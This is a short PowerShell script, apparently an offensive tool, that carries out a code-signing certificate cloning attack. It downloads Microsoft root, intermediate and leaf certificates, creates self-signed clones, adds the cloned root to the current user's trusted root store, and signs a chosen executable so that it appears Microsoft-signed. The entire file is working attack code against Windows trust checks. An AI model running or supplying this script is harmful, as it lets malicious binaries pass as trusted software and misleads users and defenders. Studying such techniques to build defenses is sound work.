# Technique taken from: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
# Remeber to set your target file path to $SignThis!!
# Example: $SignThis = "C:\Users\user\Desktop\runme.exe"; Cert-Clone.ps1;

# Setup Cert Store in Reg
$CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }
# Setup Cert Store on Disk
[system.io.directory]::CreateDirectory("C:\CertStore")

# Download Root Cert
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_root3.cer" -OutFile "C:\CertStore\msrc.cer"
$MS_Root_Cert = Get-PfxCertificate -FilePath C:\CertStore\msrc.cer
$Cloned_MS_Root_Cert = New-SelfSignedCertificate -CloneCert $MS_Root_Cert @CertStoreLocation

# Download PCA Cert
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_pca3.cer" -OutFile "C:\CertStore\mspca.cer"
$MS_PCA_Cert = Get-PfxCertificate -FilePath C:\CertStore\mspca.cer
$Cloned_MS_PCA_Cert = New-SelfSignedCertificate -CloneCert $MS_PCA_Cert -Signer $Cloned_MS_Root_Cert @CertStoreLocation

# Download Leaf Cert
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ahhh/CloneWars/master/MS_leaf3.cer" -OutFile "C:\CertStore\msleaf.cer"
$MS_Leaf_Cert = Get-PfxCertificate -FilePath C:\CertStore\msleaf.cer
$Cloned_MS_Leaf_Cert = New-SelfSignedCertificate -CloneCert $MS_Leaf_Cert -Signer $Cloned_MS_PCA_Cert @CertStoreLocation

# Import our root Cert
Export-Certificate -Type CERT -FilePath C:\CertStore\msrcc.cer -Cert $Cloned_MS_Root_Cert
Import-Certificate -FilePath C:\CertStore\msrcc.cer -CertStoreLocation Cert:\CurrentUser\Root\

# Sign target binary
Set-AuthenticodeSignature -Certificate $Cloned_MS_Leaf_Cert -FilePath $SignThis
# Check a Signature
#Get-AuthenticodeSignature -FilePath $SignThis
